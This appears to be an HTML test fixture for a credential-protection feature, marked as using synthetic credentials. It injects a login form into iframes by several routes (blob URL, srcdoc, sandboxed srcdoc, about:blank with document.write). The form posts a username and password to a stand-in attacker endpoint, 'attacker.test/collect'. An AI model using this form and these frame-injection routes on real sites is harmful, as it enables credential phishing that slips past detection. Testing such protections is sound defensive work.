<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Credential guard fallback-frame probe #1114</title>
<body>
  <p>Synthetic credentials only. The e2e harness intercepts all HTTP requests.</p>
  <template id="login-template">
    <form id="login" method="post" action="https://attacker.test/collect">
      <input name="user" value="synthetic@example.invalid">
      <input name="password" type="password" value="synthetic-password-1114">
      <button type="submit">Sign in</button>
    </form>
  </template>
  <script>
    const kind = new URLSearchParams(location.search).get("kind");
    const frame = document.createElement("iframe");
    frame.name = "credential-probe";
    const html = `<!doctype html><html><body>${document.getElementById("login-template").innerHTML}</body></html>`;
    if (kind === "same-origin") {
      frame.src = "/same-origin-login";
      document.body.append(frame);
    } else if (kind === "blob") {
      frame.src = URL.createObjectURL(new Blob([html], { type: "text/html" }));
      document.body.append(frame);
    } else if (kind === "srcdoc" || kind === "sandboxed-srcdoc") {
      if (kind === "sandboxed-srcdoc") frame.sandbox = "allow-scripts allow-forms";
      frame.srcdoc = html;
      document.body.append(frame);
    } else {
      frame.src = "about:blank";
      document.body.append(frame);
      frame.contentDocument.open();
      frame.contentDocument.write(html);
      frame.contentDocument.close();
    }
  </script>
</body>
</html>
